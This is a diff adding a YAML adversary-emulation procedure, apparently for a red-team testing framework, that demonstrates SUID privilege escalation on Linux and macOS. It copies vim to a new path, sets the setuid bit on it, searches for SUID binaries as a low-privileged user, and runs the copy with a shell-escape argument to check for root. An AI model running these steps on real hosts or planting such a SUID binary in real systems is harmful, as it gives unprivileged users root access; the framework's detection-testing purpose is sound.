@@ -1,0 +1,59 @@
+---
+name: suid-binary-escalation
+description: |
+  This TTP demonstrates how to use a SUID binary to escalate privileges.
+  If no parameters outside of the low privileged user are provided, the TTP
+  will create and execute a vulnerable scenario.
+args:
+  - name: low_priv_user
+    description: Low privileged user account to employ for privilege escalation.
+    required: true
+  - name: target_bin
+    description: Target SUID binary to employ for privilege escalation.
+    default: /usr/bin/vim
+  - name: vuln_bin
+    description: Filepath for the vulnerable bin
+    default: /usr/bin/vim-vuln
+  - name: escalation_params
+    description: Parameters provided to the vulnerable bin to execute the privilege escalation.
+    default: "-c ':silent !sudo whoami' -c 'qa'"
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+  superuser: true
+mitre:
+  tactics:
+    - TA0004 Privilege Escalation
+  techniques:
+    - T1548 Abuse Elevation Control Mechanism
+  subtechniques:
+    - T1548.001 Abuse Elevation Control Mechanism Setuid and Setgid
+
+steps:
+  - name: create-vuln-bin
+    copy_path: "{{ .Args.target_bin }}"
+    to: "{{ .Args.vuln_bin }}"
+    cleanup: default
+
+  - name: introduce-vuln
+    inline: chmod u+s {{ .Args.vuln_bin }}
+
+  - name: hunt-for-suid-bins
+    inline: |
+      su - {{ .Args.low_priv_user }}
+      find /usr/bin /usr/local/bin -perm -4000 2>/dev/null
+
+  - name: escalate-privilege
+    description: "Use {{ .Args.vuln_bin }} SUID binary to escalate privileges of {{ .Args.low_priv_user }}"
+    inline: |
+      su - {{ .Args.low_priv_user }}
+      output="$({{ .Args.vuln_bin }} {{ .Args.escalation_params }})"
+      echo "Checking results"
+      if [ "$output" == "root" ]; then
+        echo "TTP Ran Successfully"
+        exit 0
+      else
+      echo "TTP failed"
+        exit 1
+      fi
